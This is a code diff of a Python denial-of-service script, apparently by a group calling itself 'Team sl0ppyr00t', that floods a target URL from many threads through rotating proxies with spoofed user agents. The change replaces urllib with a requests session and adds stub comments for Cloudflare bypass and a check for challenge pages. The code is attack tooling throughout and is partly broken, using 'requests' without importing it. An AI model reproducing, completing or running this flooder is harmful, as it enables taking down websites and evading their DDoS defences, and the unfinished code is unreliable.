@@ -13,12 +13,14 @@ import random
 import string
 import sys
 import threading
-import time
 import urllib.request
+
+from sys import stdout
+from bs4 import BeautifulSoup
 from colorama import Fore, Style
 import urllib.request, os, threading, time, random, sys, colorama
 from colorama import Fore, Style
-from sys import stdout
+
 
 ref = [
     'https://duckduckgo.com/',
@@ -8227,50 +8229,45 @@ ua = ["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.
 			
 
 class Spammer(threading.Thread):
-    def __init__(self, url, number, lista):
+    def __init__(self, url, number, proxy_list):
         threading.Thread.__init__(self)
-        self.url = url + "?" + str(random.randint(0, 99999999)) + "=" + str(random.randint(0, 99999999))
+        self.url = url
         self.num = number
-        self.headers = {
+        self.session = requests.Session()
+        self.session.headers = {
             'User-Agent': random.choice(ua),
-            'Keep-Alive': random.randint(110, 9960),
-            'Referer': random.choice(ref),
-            'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
-            'Accept-Encoding': 'gzip;q=0,deflate;q=0',
-            'Connection': 'Keep-Alive',
-            'Cache-Control': 'no-cache, no-store, must-revalidate',
-            'Cache-directive': 'no-cache',
-            'Pragma': 'no-cache',
-            'Upgrade-Insecure-Requests': '1',
         }
-        self.Lock = threading.Lock()
-        self.lista = lista
+        self.proxy_list = proxy_list
 
     def request(self):
         global N
-        data = None
-        if N >= (len(self.lista) - 1):
+        if N >= (len(self.proxy_list) - 1):
             N = 0
-        proxy = urllib.request.ProxyHandler({'http': self.lista[N]})
-        opener = urllib.request.build_opener(proxy)
-        urllib.request.install_opener(opener)
-        req = urllib.request.Request(self.url, data, self.headers)
-        urllib.request.urlopen(req)
 
-        print(Fore.RED + "0000000000000000000000000000")
-        print(Fore.YELLOW + "DDoS, By Team sl0ppyr00t!!")
-        print(Fore.RED + "0000000000000000000000000000")
-        print(Style.RESET_ALL, end="")
+        proxy = self.proxy_list[N]
+        self.session.proxies = {
+            'http': proxy,
+            'https': proxy,
+        }
 
-        sys.stdout.write(Fore.WHITE + f"Thread #{self.num:4d} | {N:4d}/{len(self.lista)} | Proxy@{self.lista[N]}")
-        sys.stdout.flush()
-        sys.stdout.write("\r")
-	    
+        try:
+            response = self.session.get(self.url)
+            # Add Cloudflare bypass logic here (e.g., check for CAPTCHAs)
+            # Use BeautifulSoup for HTML parsing and analysis
+            soup = BeautifulSoup(response.text, 'html.parser')
+            
+            # Add more bypass methods here
+            
+            if "Challenge Page" in soup.title.string:
+                print(f'Challenge Page Detected on Thread #{self.num}, Proxy: {proxy}')
+            else:
+                print(f'Successful Request on Thread #{self.num}, Proxy: {proxy}')
+
+        except Exception as e:
+            print(f'Error on Thread #{self.num}: {str(e)}')
+
     def run(self):
         global N
-        self.Lock.acquire()
-        print("Thread #%4d |" % self.num)
-        self.Lock.release()
         time.sleep(1)
         while True:
             try:
@@ -8278,7 +8275,6 @@ class Spammer(threading.Thread):
                 self.request()
             except:
                 pass
-        sys.exit(0)
 
 def title():
     sys.stdout.write("                                                                                          \n")
